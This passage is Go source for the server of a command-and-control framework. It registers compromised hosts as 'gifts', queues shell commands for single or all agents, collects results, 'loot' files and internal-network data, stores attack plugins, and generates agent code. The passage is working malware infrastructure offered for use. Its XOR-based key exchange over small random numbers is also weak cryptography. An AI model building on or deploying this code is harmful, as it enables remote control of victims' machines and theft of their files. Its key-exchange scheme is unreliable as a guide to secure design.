package main

import (
	"math/rand"
	"crypto/md5"
    "mime/multipart"
    "encoding/base64"
    "encoding/hex"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"crypto/tls"
	"encoding/json"
	"bufio"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"flag"
	"time"
	"regexp"
    "bytes"
    "errors"
    "math"
    "server/protocol"
    "reflect"
)

var (
	/**/key_map = make(map[string]string)
	key1_map = make(map[string][]int)
	key2_map = make(map[string][]int)
	/**/mutex   = &sync.Mutex{}

	msg_get = make(map[string][]Msg_get_list)//msg_get切片
    msg_post = make(map[string][]string)//msg_post切片
    msg_map = make(map[string][]string)//msg_map_save切片

	file_list = make(map[string]string)
	/**/shell_net_post = make(map[string]string)
    sessionSlice []string
    /**/error_str string
    UploadFile_byte_parts = make(map[string][]byte)
    DownloadFile_byte_parts = make(map[string][]byte)
    parts_count = make(map[string]int)
    /**/keyPartArr = make(map[string][]int)
    /**/logger = &MyLog{}
    /**/serverMap = make(map[string]*http.Server)
    web_title string
)
type Msg_get_list struct {
    Ori_Msg string `json:"Ori_msg"`
    Encry_Msg string `json:"Encry_msg"`
}
type MainHandler struct{}
//无权限交互
func (m *MainHandler) Index(conn, Get_Msg,switch_key,encry_key,download,result,net,info,upload,list,option,uid,username,hostname,keyPart,filekey string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:

			// 处理 GET 请求
			op := r.URL.Query().Get(option)
			uid := r.URL.Query().Get(uid)
			username := r.URL.Query().Get(username)
			shellname := r.URL.Query().Get(hostname)
			key_mid := r.URL.Query().Get(keyPart)
            filekey := r.URL.Query().Get(filekey)
            clientIP := getClientIP(r)


			switch op {
				case conn: //监听
                    uid_c,_:= base64.URLEncoding.DecodeString(uid)
                    shellname_c,_:= base64.URLEncoding.DecodeString(shellname)
                    username_c,_:= base64.URLEncoding.DecodeString(username)
                    keyStr:= Get_conn(string(uid_c), string(username_c), string(shellname_c), clientIP)
                    fmt.Fprint(w, keyStr)                
				case Get_Msg: //获取指令
					data := GetMsg(uid)
                    fmt.Fprint(w,data)
				case switch_key: //发送与交换密钥
				    err := Switch_key(uid,key_mid)
                    if err != nil {
                        return
                    }
				case encry_key: //获取未加密密钥
					func(uid string) {
						mutex.Lock()
						defer mutex.Unlock()
						for _, conn := range data_conn.Conns {
							if uid == conn.Uid {
								if conn.HostKey != "" && conn.HostKey != "null" {
									fmt.Fprint(w, conn.HostKey)
									EncryptHostKey(conn.Uid,conn.HostKey)
									break
								}else{
									return
								}
							}
						}
					}(uid)
                case download:
                    fileByte, err := DownloadFile(uid,filekey)
                    if err != nil {
                        return
                    }
                    w.Header().Set("Content-Type", "application/octet-stream")
                    w.Header().Set("Accept-Ranges", "bytes")
                    w.Write(fileByte)
                    if f, ok := w.(http.Flusher); ok {
                        f.Flush()
                    }
			}
			
		case http.MethodPost:
			op := r.URL.Query().Get(option)
			switch op {
				case result: //写入结果
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&requestBody)
                    if err != nil {
                        return
                    }
                    uid, ok1 := requestBody[uid]
                    results, ok2 := requestBody[result]
                    if !ok1 || !ok2{
                        return
                    }
                    Results(uid,results)
				case net: //接收内网信息
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&requestBody)
                    if err != nil {
                        return
                    }
                    uid, ok1 := requestBody[uid]
                    results, ok2 := requestBody[result]
                    if !ok1 || !ok2 || uid == "" || results == "" {
                        return
                    }
					Net_results(uid,results)
				case info:  //接收客户端信息
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err1 := decoder.Decode(&requestBody)
                    if err1 != nil {
                        return
                    }
                    uid,ok1 := requestBody[uid]
                    encry_str,ok2 := requestBody[result]
                    clientIP := getClientIP(r)
                    key, ok3 := key_map[uid]
                    if !(ok1 && ok2 && ok3){
                        return
                    }
                    GetInfo(uid,encry_str,key,clientIP)
				case upload: //客户端上传文件
                    uid := r.FormValue(uid)
                    data := r.FormValue(result)
                    // 读取上传的文件块
                    file, header, err := r.FormFile(upload)
                    if err != nil {
                        return
                    }
                    defer file.Close()
					UploadFileHandler(uid,data,header,file)
				case list: //客户端写入目录
                    var request map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&request)
                    if err != nil {
                        return
                    }
                    uid, ok1 := request[uid]
                    file, ok2 := request[result]
                    if !ok1 || !ok2 {
                        return
                    }
					Put_file_list(uid,file)
			}
		}
	}
}
//有权限交互,必须先登录,此路由下不需要错误报错回显
func User_index()http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		usernameCookie, err := r.Cookie("cookie")
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        var foundUser bool
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
		switch r.Method {
			case http.MethodGet:
				op := r.URL.Query().Get("op")
				uid := r.URL.Query().Get("uid")
				username := r.URL.Query().Get("username")
				shellname := r.URL.Query().Get("request")
				msg := r.URL.Query().Get("msg")
				target := r.URL.Query().Get("target")
				osType := r.URL.Query().Get("osType")
                clientsCount := r.URL.Query().Get("clientsCount")
                user := r.URL.Query().Get("user")
                hostname := r.URL.Query().Get("hostname")
                keyPart := r.URL.Query().Get("keyPart")
                filekey := r.URL.Query().Get("filekey")

                ptc := r.URL.Query().Get("protocol")
                _os := r.URL.Query().Get("os")
                server := r.URL.Query().Get("server")
                Path := r.URL.Query().Get("Path")

                ConnPath := r.URL.Query().Get("ConnPath")
                MsgPath := r.URL.Query().Get("MsgPath")
                switch_key := r.URL.Query().Get("switch_key")
                encry_key := r.URL.Query().Get("encry_key")
                download := r.URL.Query().Get("download")
                result := r.URL.Query().Get("result")
                _net := r.URL.Query().Get("net")
                info := r.URL.Query().Get("info")
                upload := r.URL.Query().Get("upload")
                list := r.URL.Query().Get("list")
                option := r.URL.Query().Get("option")
                s_id := r.URL.Query().Get("s_id")
                pos := r.URL.Query().Get("pos")
                indexStr := r.URL.Query().Get("index")
                code := r.URL.Query().Get("code")
                remark := r.URL.Query().Get("remark")

                port := r.URL.Query().Get("port")
                file := r.URL.Query().Get("file")

				switch op{
					case "listen": //用户操作,第一次交互
						str := Listen(username)
                        fmt.Fprint(w, str)
					case "getResults": //用户操作，获取执行结果
						results := Getresults(uid)
                        fmt.Fprint(w,results)
					case "getOs": //获取操作系统
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].OS)
									break
								}
							}
						}(uid)
					case "insertKey": //插入密钥
                        mutex.Lock()
                        defer mutex.Unlock()
						Insert_key(uid, username,shellname)
					case "msg": //用户操作,写入指令
						err_str := Getcmd(uid,msg)
                        if err_str != ""{
                            http.Error(w, "msg null", http.StatusInternalServerError)
                        }
					case "delShellInnet": //用户操作删除内网
						str := Del_shell_innet(target,shellname,uid)
                        fmt.Fprintf(w,str)
					case "userIndex": //客户端信息
                        matchedClients, err := UserIndex(username, clientsCount)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        if matchedClients != nil {
                            w.Header().Set("Content-Type", "application/json")
                            err := json.NewEncoder(w).Encode(matchedClients)
                            if err != nil {
                                http.Error(w, "json data error", http.StatusInternalServerError)
                            }
                        } else {
                            w.Header().Set("Content-Type", "text/plain")
                            w.Write([]byte("noNeeded"))
                        }
                    case "ServerIndex":
                        matchedClients, err := ServerIndex(clientsCount)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        if matchedClients != nil {
                            w.Header().Set("Content-Type", "application/json")
                            err := json.NewEncoder(w).Encode(matchedClients)
                            if err != nil {
                                http.Error(w, "json data error", http.StatusInternalServerError)
                            }
                        } else {
                            w.Header().Set("Content-Type", "text/plain")
                            w.Write([]byte("noNeeded"))
                        }
					case "delIndex": //删除第一次交互
						DeleteEntry(uid)
					case "delInfo": //删除客户端
                        func(uid string) {
                            mutex.Lock()
                            defer mutex.Unlock()
                            for i := len(client_data.Clients) - 1; i >= 0; i-- {
                                client := client_data.Clients[i]
                                if uid == client.Uid {
                                    // 更新 server_data.Servers 的 Clients 数量
                                    for j := len(server_data.Servers) - 1; j >= 0; j-- {
                                        if client.Server == server_data.Servers[j].Remark {
                                            if server_data.Servers[j].Clients > 0 {
                                                server_data.Servers[j].Clients--
                                            }
                                        }
                                    }
                                    client_data.Clients = append(client_data.Clients[:i], client_data.Clients[i+1:]...)
                                    delete(key_map, uid)
                                    fmt.Fprintf(w, "Successfully deleted host: Host name:%s, uid:%s", client.Host, uid)
                                    break
                                }
                            }
                        }(uid)     
					case "getFileList": //读取客户端目录
						file_str := Get_file_list(uid)
                        if file_str != ""{
                            fmt.Fprintf(w,file_str)
                        }
                    case "logRead": //读取日志
                        lines, err := Log_read()
                        if err != nil {
                            // 处理错误
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "text/plain")
                        for _, line := range lines {
                            fmt.Fprintln(w, line)
                        }
					case "getCurrentDir": //查询当前目录
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprint(w, client_data.Clients[i].CurrentDir)
									break
								}
							}
						}(uid)
					case "getFile": //获取所有用户战利品
						Get_loots(username,w,r)
                    case "getAll": //获取用户名下客户端
                        shell_list, err := Get_Clients(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        if err := json.NewEncoder(w).Encode(shell_list); err != nil {
                            http.Error(w, "json error", http.StatusInternalServerError)
                            return
                        }
					case "getShellInnet": //获取客户端内网IP
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].LocalIP)
									break
								}
							}
						}(uid)
                    case "net_getresults": // 获取客户端内网资产
                        result, err := Net_getresults(uid)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusBadRequest)
                            return
                        }
                        fmt.Fprint(w, result)                    
					case "getInnet": //查询内网资产
						getInnet(uid,w)
					case "AllMsg": //集体指令
						getAll(username,msg,osType)
                    case "checkTime":
                        checkMap, err := Check_Time(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "checkclient":
                        checkMap, err := Check_clients()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "confirm":
                        client, err := Confirm_chan(uid, username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        jsonData, err := json.Marshal(client)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Write(jsonData)
                    case "agentcode":
                        code := Generate_agent(ptc,_os,server,Path,ConnPath,MsgPath,switch_key,encry_key,download,result,_net,info,upload,list,option,username,user,uid,hostname,keyPart,filekey,code)
                        fmt.Fprint(w, code)
                    case "delserver":
                        found := false
                        for i, server := range server_data.Servers {
                            if port == server.Port {
                                if server.Clients != 0 {
                                    stop_str := fmt.Sprintf("[!] This server has agents,can not stop\n")
                                    fmt.Fprint(w,stop_str)
                                    logger.WriteLog(stop_str)
                                    return
                                }
                                protocol.StopServer(port)
                                server_data.Servers = append(server_data.Servers[:i], server_data.Servers[i+1:]...)
                                found = true
                                stop_str := fmt.Sprintf("[*] Server on port %s stopped and removed successfully\n", port)
                                logger.WriteLog(stop_str)
                                break
                            }
                        }
                        if !found {
                            stop_str := fmt.Sprintf("[!] No server found on port %s\n", port)
                            logger.WriteLog(stop_str)
                        }
                    case "getloot":
                        if uid == "" || file == "" {
                            http.Error(w, "no parameter", http.StatusBadRequest)
                            return
                        }
                        filePath := filepath.Join("uploads", uid, file)
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "no file", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(file))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeFile(w, r, filePath)
                    case "changeMsh":
                        //列表插队
                        ChangeMsh(uid,s_id,pos)
                    case "getMsgList":
                        //消息带结果，获取msg_get中uid对应的消息
                        msgList := GetMsgList(uid)
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        })
                    //按索引msg_get中uid对应的消息
                    case "delMsgGet":
                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        if index < 0 || index >= len(msg_get[uid]) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        // 删除指定索引的消息
                        msg_get[uid] = append(msg_get[uid][:index], msg_get[uid][index+1:]...)
                        fmt.Fprintf(w, "msg_get for uid %s at index %d deleted successfully", uid, index)
                    //按索引删除msg_map中uid对应的消息
                    case "delMsgMap":
                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        if index < 0 || index >= len(msg_map[uid]) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        // 删除指定索引的消息
                        msg_map[uid] = append(msg_map[uid][:index], msg_map[uid][index+1:]...)
                        fmt.Fprintf(w, "msg_map for uid %s at index %d deleted successfully", uid, index)
                    case "getMsgPost":
                        //插队消息，获取msg_map中uid对应的消息
                        msgList:= msg_map[uid]
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        }) 
                    //清空uid对应的msg_map
                    case "cleanupMsg":
                        mutex.Lock()
                        defer mutex.Unlock()
                        if _, ok := msg_map[uid]; ok {
                            delete(msg_map, uid)
                            fmt.Fprintf(w, "msg_map for uid %s cleared successfully", uid)
                        } else {
                            fmt.Fprintf(w, "msg_map for uid %s does not exist", uid)
                        }
                    //获取插件
                    case "getPlugin":
                        mutex.Lock()
                        defer mutex.Unlock()
                        //创建切片
                        code_silce := make([]string, 0)
                        for _, plugin := range server_plugin.Plugins {
                            if plugin.Remark == remark && plugin.os == _os {
                                // 返回插件的详细信息
                                code_silce = append(code_silce,plugin.Code)
                            }
                        }
                        if code_silce != nil && len(code_silce) > 0 {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": code_silce,
                            })
                        } else {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": {"/*code*/"},
                            })
                        }
                    //按索引和os与remark删除插件
                    case "delPlugin":
                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        if index < 0 || index >= len(server_plugin.Plugins) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        // 检查插件是否存在
                        if index < len(server_plugin.Plugins) && server_plugin.Plugins[index].Remark == remark && server_plugin.Plugins[index].os == _os {
                            // 删除指定索引的插件
                            server_plugin.Plugins = append(server_plugin.Plugins[:index], server_plugin.Plugins[index+1:]...)
                            fmt.Fprintf(w, "Plugin at index %d for remark %s and os %s deleted successfully", index, remark, _os)
                        } else {
                            http.Error(w, fmt.Sprintf("No plugin found at index %d for remark %s and os %s", index, remark, _os), http.StatusNotFound)
                            return
                        }
                    case "cleanup":
                        ClearUnmarkedGlobalVars()
				}
			case http.MethodPost:
				op := r.URL.Query().Get("op")
				switch op{
                    case "uploadFile":
                        uid := r.FormValue("uid")
                        file, _, err := r.FormFile("uploadFile")
                        filename := r.FormValue("filename")
                        splitSize := r.FormValue("splitSize")
                        if err != nil {
                            http.Error(w, "parameter does not exist", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        // 读取文件内容到字节切片
                        fileContent, err := io.ReadAll(file)
                        if err != nil {
                            http.Error(w, "failed to read file", http.StatusInternalServerError)
                            return
                        }
                        // 调用处理文件的函数
                        UserUploadFile(uid,filename,splitSize,fileContent)        
                    case "change":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        str:= Change(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay)
                        fmt.Fprintf(w,str)
                    case "insertPlugin":
                        // 插入插件
                        var requestData struct {
                            Remark         string `json:"remark"`
                            Code         string `json:"code"`
                            CodeWords string `json:"codeWords"`
                            Os        string `json:"os"`
                            Parameter   string `json:"parameter"`
                            //插件解释
                            ParameterDesc string `json:"parameterDesc"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Remark == "" || requestData.Code == "" || requestData.Os == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        // codeword是否重复冲突
                        for _, plugin := range server_plugin.Plugins {
                            if plugin.CodeWord == requestData.CodeWords && plugin.os == requestData.Os {
                                http.Error(w, "CodeWords already exists: "+requestData.CodeWords, http.StatusBadRequest)
                                return
                            }
                        }
                        //用逗号分割parameter
                        parameterParts := strings.Split(requestData.Parameter, ",")
                        //如果分割不了那就是只有一个参数
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            parameterParts = []string{parameterParts[0]}
                        }
                        if parameterParts == nil || len(parameterParts) == 0 {
                            http.Error(w, "Parameter fields must not be empty", http.StatusBadRequest)
                            return
                        }
                        ParameterDesc := strings.Split(requestData.ParameterDesc, ",")
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            ParameterDesc = []string{ParameterDesc[0]}
                        }
                        // 检查参数是否重复和不为空
                        paramSet := make(map[string]bool)
                        for _, p := range parameterParts {
                            if paramSet[p] {
                                http.Error(w, "Parameter fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                paramSet[p] = true
                            }
                        }
                        // 插入插件到 serverPlugin
                        plugin := Plugin{
                            Remark:       requestData.Remark,
                            Code:       requestData.Code,
                            CodeWord: requestData.CodeWords,
                            os:         requestData.Os,
                            parameter:  parameterParts,
                            ParameterDesc: ParameterDesc,
                        }
                        //插入server_plugin
                        server_plugin.Plugins = append(server_plugin.Plugins, plugin)
                        // 插入成功后返回成功消息
                        logger.WriteLog(fmt.Sprintf("[*] Plugin inserted successfully for %s,code:%s\n", requestData.Remark, requestData.Code))
                        fmt.Fprintf(w, "Plugin inserted successfully for %s", requestData.Remark)
                    case "startServer":
                        var requestData struct {
                            Port         string `json:"port"`
                            Path         string `json:"path"`
                            ConnPath     string `json:"connPath"`
                            MsgPath      string `json:"msgPath"`
                            SwitchKey    string `json:"switch_key"`
                            EncryKey     string `json:"encry_key"`
                            Download     string `json:"download"`
                            Result       string `json:"result"`
                            Net          string `json:"net"`
                            Info         string `json:"info"`
                            Upload       string `json:"upload"`
                            List         string `json:"list"`
                            Option       string `json:"option"`
                            Uid          string `json:"uid"`
                            Hostname     string `json:"hostname"`
                            KeyPart      string `json:"keyPart"`
                            Filekey      string `json:"filekey"`
                            Protocol     string `json:"protocol"`
                            User     string `json:"user"`
                            Remark       string `json:"remark"`
                            CertContent  string `json:"cert"`
                            KeyContent   string `json:"key"`
                        }
                        
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Path == "" || requestData.Port == "" || requestData.Protocol == "" || requestData.Remark == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        for _, server := range server_data.Servers {
                            if requestData.Port == server.Port || requestData.Remark == server.Remark {
                                http.Error(w, "Port occupancy or remark already exists", http.StatusBadRequest)
                                return
                            }
                        }
                        paths := []string{
                            requestData.ConnPath,
                            requestData.MsgPath,
                            requestData.SwitchKey,
                            requestData.EncryKey,
                            requestData.Download,
                            requestData.Result,
                            requestData.Net,
                            requestData.Info,
                            requestData.Upload,
                            requestData.List,
                            requestData.Option,
                            requestData.Uid,
                            requestData.Hostname,
                            requestData.KeyPart,
                            requestData.Filekey,
                            requestData.User,
                        }
                        
                        pathSet := make(map[string]bool)
                        // 检查路径是否重复和不为空
                        for _, p := range paths {
                            if pathSet[p] {
                                http.Error(w, "Path fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                pathSet[p] = true
                            }
                        }
                        if requestData.Protocol == "https" || requestData.Protocol == "http" {
                            handler := &MainHandler{}
                            serverManager := &MyServer{}

                            protocol.Http_server(handler, serverManager, logger, requestData.Port, requestData.Path,
                                requestData.ConnPath, requestData.MsgPath, requestData.SwitchKey, requestData.EncryKey,
                                requestData.Download, requestData.Result, requestData.Net, requestData.Info, requestData.Upload,
                                requestData.List, requestData.Option, requestData.Protocol, requestData.Uid, requestData.User,
                                requestData.Hostname, requestData.KeyPart, requestData.Filekey, requestData.Remark,
                                defaultCert, defaultKey, requestData.CertContent, requestData.KeyContent)
                            
                        }
                }
		}
	}
}
//接收
func GetInfo(uid,encry_str,key,clientIP string){
    var server_remark string
    data := Get_decry_s(&encry_str, &key,&uid)
    data_list := strings.Split(data,"^")
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    port := data_list[7]
    protocol := data_list[8]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    Remarks := "null"
    hash:=md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt,_:= strconv.Atoi(t)
    mutex.Lock()
    for i, server := range server_data.Servers {
        if port == server.Port && strings.HasPrefix(protocol,server.Protocol){
            server_data.Servers[i].Clients++
            server_remark = server_data.Servers[i].Remark
        }
    } 
    mutex.Unlock()
    put_client(username, shellname, osname, formattedTime, clientIP,currentDir,version,innet_ip,Remarks,uid,server_remark,timeInt)
    log_str1:=fmt.Sprintf("====A new gift====\t\n%v====Received by user:%vConnection of:%v,uid:%v,Host:%v,OS:%v,Delay:%v,Key:%v,Path:%s,Shell:%s====\n", formattedTime,username,clientIP,uid,shellname, osname, t, hashString[12:], currentDir, version)
    logger.WriteLog(log_str1)
    DeleteEntry(uid)
}
func Change(uid, username, remarks, delay string)string{
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil {
                return "delay is not int"
            }
            usernameModified := false
            remarksModified := false
            delayModified := false
            if username != client_data.Clients[i].Username {
                userExists := false
                for _, findUser := range client_data.Clients {
                    if findUser.Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists {
                    return "user already exists"
                }
                client_data.Clients[i].Username = username
                usernameModified = true
            }      
            if remarks != client_data.Clients[i].Remarks {
                client_data.Clients[i].Remarks = remarks
                remarksModified = true
            }
            if int_delay != client_data.Clients[i].Delay {
                if int_delay < 1 {
                    int_delay = 1
                }
                client_data.Clients[i].Delay = int_delay
                delayModified = true
                cmd := "getTime^"+delay
                Getcmd(uid,cmd)
            }
            if !usernameModified && !remarksModified && !delayModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Confirm_chan(uid, username string) (Client, error) {
    for _, client := range client_data.Clients {
        if uid == client.Uid && username == client.Username {
            return client, nil
        }
    }
    return Client{}, fmt.Errorf("client not found")
}

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ip := forwarded
		if comma := strings.Index(forwarded, ","); comma > 0 {
			ip = forwarded[:comma]
		}
		return ip
	}
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func Get_conn(uid,username, hostname,clientIP string) string {
	current := time.Now()
	formattedTime := current.Format("2006.01.02 15:04")
	mutex.Lock()
	defer mutex.Unlock()
	// 循环查询并更新链接结构体
	for i, conn := range data_conn.Conns {
		if username == conn.Username && hostname == conn.Host && uid == conn.Uid {
			data_conn.Conns[i].OnlineTime = formattedTime
            delete(key_map, uid)
            key2_map[uid] = nil
			key1_map[uid] = nil
			for {
				check_key := insert_key1_map(uid)
				if check_key == false {
					time.Sleep(1 * time.Second)
				} else {
					break
				}
			}
			//返回约定公钥,与服务器中间值
			ketStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v",key1_map[uid][0],key1_map[uid][1],key1_map[uid][2],key1_map[uid][3],key1_map[uid][8],key1_map[uid][9],key1_map[uid][10],key1_map[uid][11])
			return ketStr
		}
	}
	// 如果未找到，则插入新链接结构体
	put_conn(username, hostname, formattedTime,uid, clientIP, "null")
    delete(key_map, uid)
    key2_map[uid] = nil
	key1_map[uid] = nil
	for {
        check_key := insert_key1_map(uid)
        if check_key == false {
            time.Sleep(1 * time.Second)
        }else{
            break
        }
    }
	//返回约定公钥,与服务器中间值
	keyStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v",key1_map[uid][0],key1_map[uid][1],key1_map[uid][2],key1_map[uid][3],key1_map[uid][8],key1_map[uid][9],key1_map[uid][10],key1_map[uid][11])
    return keyStr
}

func Listen(username string) string {
    var lastuid string
    var uid string
    var str string
    for i, client := range data_conn.Conns {
        if client.Username == username {
            uid = data_conn.Conns[i].Uid
        }
        if lastuid != uid {
            str += fmt.Sprintf("<div class='ip-container' id='container-%s'>", client.Host)
            str += fmt.Sprintf("<p class='ip-address' id='%s'>[Uid:%s]</p>", client.Uid, html.EscapeString(client.Uid))
            str += fmt.Sprintf("<p class='shell-address' id='%s'>[Host:%s]</p>", client.Host, html.EscapeString(client.Host))
            str += fmt.Sprintf("<p class='online-time'>[online time:%s]</p>", html.EscapeString(client.OnlineTime))
            str += fmt.Sprintf("<p class='shell-address'>[IP:%s]</p>", html.EscapeString(client.ShellIP))
            str += fmt.Sprintf("<button class='let-it-in-button' id='button_%s' onclick=\"get_conn('%s','%s')\">receive</button>", client.Host, client.Uid, client.Host)
            str += fmt.Sprintf("<button class='let-it-in-button' onclick=\"del_conn('%s')\">remove</button>", client.Uid)
            str += "</div>"
            lastuid = uid
        }
    }
    return str
}

// 获取密钥
func insert_key1_map(uid string) bool {
    key1_map[uid] = []int{
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
    }
    for _, key := range key1_map[uid] {
        if key <= 0 || key > 50 {
            return false 
        }
    }
    intermediate := []int{
        key1_map[uid][0] ^ key1_map[uid][4],
        key1_map[uid][1] ^ key1_map[uid][5],
        key1_map[uid][2] ^ key1_map[uid][6],
        key1_map[uid][3] ^ key1_map[uid][7],
    }
    if len(intermediate) < 4 || intermediate[0] == 0 || intermediate[1] == 0 || intermediate[2] == 0 || intermediate[3] == 0 {
        return false
    }
    key1_map[uid] = append(key1_map[uid], intermediate...)
    return true
}

//接收客户端中间值添加与服务器私钥交互计算出最终密钥再与data_conn.Conns[i].HostKey交互返回给客户端
func Switch_key(uid,key_part string)error{
	for _, conn := range data_conn.Conns {
		if uid == conn.Uid{
			serverPrivateKey := key1_map[uid][4:8]
			conn_parts := strings.Split(key_part, "-")
			clientIntermediate := make([]int, 4)
			for i, part := range conn_parts {
				var err error
				clientIntermediate[i], err = strconv.Atoi(part)
				if err != nil {
					return err
				}
			}
			serverFinalcKey := []int{
				clientIntermediate[0] ^ serverPrivateKey[0],
				clientIntermediate[1] ^ serverPrivateKey[1],
				clientIntermediate[2] ^ serverPrivateKey[2],
                clientIntermediate[3] ^ serverPrivateKey[3],
			}
			key2_map[uid] = append(key2_map[uid],serverFinalcKey...)
            return nil
		}
	}
    return nil
}

func EncryptHostKey(uid,key string){
	pavi_key,exists1 := key2_map[uid]
	client_key := []byte(key)
	if exists1{
		for j := 0; j < 256 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[0]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[0])
			}
		}
		for j := 256; j < 512 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[1]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[1])
			}
		}
		for j := 512; j < 768 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[2]) {
